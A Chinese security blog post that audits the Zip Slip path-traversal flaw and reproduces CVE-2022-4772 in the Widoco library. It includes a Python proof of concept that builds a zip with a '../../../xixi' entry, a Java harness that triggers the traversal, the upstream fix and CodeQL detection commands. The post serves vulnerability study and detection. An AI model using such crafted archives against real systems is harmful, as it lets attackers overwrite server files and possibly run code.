---
title: Zip Slip漏洞审计实战 - admin-神风
url: https://www.cnblogs.com/wh4am1/p/17201960.html
source: 博客园 - admin-神风
date: 2023-03-10
fetch_date: 2025-10-04T09:08:50.985733
---

# Zip Slip漏洞审计实战 - admin-神风

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/wh4am1/)

# [admin-神风](https://www.cnblogs.com/wh4am1)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/wh4am1/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/admin-%E7%A5%9E%E9%A3%8E)
* 订阅
* [管理](https://i.cnblogs.com/)

# [Zip Slip漏洞审计实战](https://www.cnblogs.com/wh4am1/p/17201960.html "发布于 2023-03-09 23:45")

### 前言

最近看到许少的推有说到Zip Slip这个漏洞导致的RCE，其实我在代码审计的时候确实发现有不少功能模块都是使用ZIP来解压，其实还是在真实系统中经常见到的。

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309233953249-1468239028.png)

于是想着好久没有写过博客了，想借着这次机会更新一下吧，免得读者以为我在偷懒没学习了~

### Zip Slip是什么漏洞

Zip Slip是一种在压缩包中特制(../../../evil.sh)的解压缩文件替换漏洞，包括多种解压缩如tar、jar、war、cpio、apk、rar、7z和zip等。

Java中较为常见的场景是上传压缩包进行解压的时候，后端使用解压类直接将压缩包当中的节点解压出来，可能会通过节点的名字../跳转到上级目录中，从而导致任意目录的文件替换。如果结合系统特性和某些定时任务脚本，就可能导致RCE的执行，因此该漏洞也被标记为高危漏洞。

我从先知上TGAO师傅发布的文章里面公布的poc：

```
import zipfile

if __name__ == "__main__":
    try:
        zipFile = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("poc.zip")
        zipFile.write("E:/qqq.txt", "../../../xixi", zipfile.ZIP_DEFLATED)
        zipFile.close()
    except IOError as e:
        raise e
```

其中qqq.txt是需要压缩的文件，../../../xixi是该文件在压缩包中的名字

之后在Java中使用zipEntry.getName()等方法获取的就是../../../xixi这个字符串

更多的框架Zip-Slip漏洞可以在开源项目中找到：<https://github.com/snyk/zip-slip-vulnerability>

### 漏洞分析实战

#### java.util.zip.ZipEntry

该类是Jdk中自带的原生类，在TGAO师傅发布的文章中介绍到了，这里就不在赘述了

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234058878-67871688.png)

#### Widoco Zip-Slip(CVE-2022-4772)漏洞分析

##### 漏洞描述

WIDOCO是一个用于记录本体的向导。帮助您通过在GUI中执行一系列步骤，自动发布和创建一个丰富的、定制的本体文档。 WIDOCO在1.4.17版本之前存在Zip-Slip漏洞，漏洞点在src/main/java/widoco/WidocoUtils.java文件中，通过unZipIt函数可以将zip包中的文件写入到任意可写入的文件夹中，这将影响服务器的完整性。

##### 漏洞定位

查看1.4.17版本和Github上Master最新的版本做对比

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234134054-812493531.png)

发现是在方法Unzipit中进行了修补

##### 漏洞复现

首先添加Widoco有漏洞版本到项目依赖中

```
<dependencies>
  <dependency>
      <groupId>com.github.dgarijo</groupId>
      <artifactId>Widoco</artifactId>
      <version>v1.4.16</version>
  </dependency>
</dependencies>

[ ... ]

<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```

 运行poc.py，设置跨越到上级目录../xixi文件

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234218822-1928463869.png)

再编写漏洞利用代码，模拟真实场景下压缩包解压的情况

```
package javaTest;

import widoco.WidocoUtils;

public class GST {
    public static void main(String[] args){
        String path = GST.class.getResource("/").toString();
        System.out.println("path = " + path);
        String resourceName = "/poc.zip";
        String outputFolder = "E:\\work\\TempVuln\\tempDir";
        WidocoUtils.unZipIt(resourceName,outputFolder);
        System.out.println("Done");
    }
}
```

执行后xixi文件就直接被解压到上级目录下，造成Zip-Slip漏洞

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234254073-225624165.png)

再来看看修复方案，是判断解压的路径和设置的目标主目录是否是相等的，如果不是则抛出异常

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234316201-1394546946.png)

##### 使用CodeQL发现漏洞

首先下载目标对应版本的项目，使用如下命令创建数据库

```
codeql database create qldb-test -l java
```

创建成功后会有successful的提示

之后使用database analyze进行分析

```
codeql database analyze qldb-test E:\codeql\ql\java\ql\src\Security\CWE --format=sarifv2.1.0 --output=result.sarif
```

这里的路径是CWE的分析规则，挨个进行分析

在该目录会生成一个result.sarif文件，通过vscode的sarif viewer插件打开

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234410722-1254679422.png)

打开sarif文件，从RULES一栏中可以看到zipslip的漏洞就发现了

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234435455-417220396.png)

如此的漏洞，在代码审计和系统中很多开发人员都不知道，也许随手就拿来用了

![](https://img2023.cnblogs.com/blog/1124287/202303/1124287-20230309234454485-327810408.png)

### Reference

[1].<https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf>

[2].<https://github.com/snyk/zip-slip-vulnerability>

[3].<https://xz.aliyun.com/t/12081>

[4].<https://github.com/dgarijo/Widoco/pull/551>

[5].<https://vip.riskivy.com/detail/1607889173715488768>

posted @
2023-03-09 23:45
[admin-神风](https://www.cnblogs.com/wh4am1)
阅读(2695)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025

[![](//assets.cnblogs.com/images/ghs.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771)
[浙ICP备2021040463号-3](https://beian.miit.gov.cn)